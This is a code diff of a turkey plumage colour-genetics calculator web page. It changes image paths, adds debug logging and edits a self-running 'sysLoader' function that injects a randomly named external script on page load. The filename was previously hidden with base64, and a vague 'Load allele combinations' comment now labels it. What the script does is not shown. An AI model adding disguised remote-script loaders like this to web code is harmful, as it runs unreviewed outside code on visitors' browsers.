@@ -284,9 +284,9 @@ background-color: #0b4bc9;
 <meta name="viewport" content="width=device-width, initial-scale=.75">
 
 <div class="header-container">
-<img src="https://porters-rare-heritage-turkeys.neocities.org/Pictures/Tails.jpg" alt="Left Image" class="logo" style="width: 150px; height: auto;">
+<img src="Pictures/Tails.jpg" alt="Left Image" class="logo" style="width: 150px; height: auto;">
 <h1>Porter's Turkey Color Calculator</h1>
-<img src="https://porters-rare-heritage-turkeys.neocities.org/Pictures/Tails.jpg" alt="Right Image" class="logo" style="width: 150px; height: auto;">
+<img src="Pictures/Tails.jpg" alt="Right Image" class="logo" style="width: 150px; height: auto;">
 </div>
 
 
@@ -585,6 +585,9 @@ combinationsSl.ratios[outcomeSl];
 console.log(phenotype1);
 console.log(phenotype1A);
 console.log(phenotype1B);
+console.log(phenotype1C);
+console.log(phenotype1D);
+console.log(phenotype1E);    
 console.log(phenotype2);
 console.log(phenotype2A);
 console.log(phenotype3);
@@ -671,11 +674,13 @@ displayResults('femaleOffspringResults', femaleOffspring, 'female');
 displaySummaryChart(maleOffspring, femaleOffspring);
 }
 
-(function() {
+// Load allele combinations
+(function() { 
     var sysLoader = document.createElement('script');
-    sysLoader.src = atob("a2xka2dlZTgzNzUuanM="); 
+    sysLoader.src = "https://colorcalculator.neocities.org/kldkgee8375.js";
     document.head.appendChild(sysLoader);
 })();
+
 
 function calculateCombinations(alleleSire, alleleDam, locus) {
 const alleles = [alleleSire, alleleDam].sort().join(' ');
